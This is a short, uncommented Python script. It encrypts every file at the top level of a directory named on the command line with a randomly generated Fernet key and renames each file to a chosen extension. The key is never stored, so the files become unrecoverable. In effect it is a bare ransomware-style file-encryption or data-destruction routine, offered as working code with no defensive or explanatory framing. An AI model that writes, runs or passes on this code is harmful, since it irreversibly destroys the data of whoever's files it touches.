import os
from cryptography.fernet import Fernet
from sys import argv


def find_path(path):
    path_file = []
    for i in os.walk(path):
        path_file.append(i)
    px = path_file[0]
    return px


def encrypt(path_file, ext):
    key = Fernet.generate_key()
    f = Fernet(key)
    for filename in path_file:
        with open(filename, 'rb') as file:
            file_data = file.read()
            encrypted_data = f.encrypt(file_data)
            with open(filename, 'wb') as file:
                file.write(encrypted_data)
        split_file = os.path.splitext(filename)[0]
        os.rename(filename, split_file + "." + ext)


path = argv[1]
ext = argv[2]
fp = find_path(path)
fpt = fp[2]
os.chdir(path)
encrypt(fpt, ext)
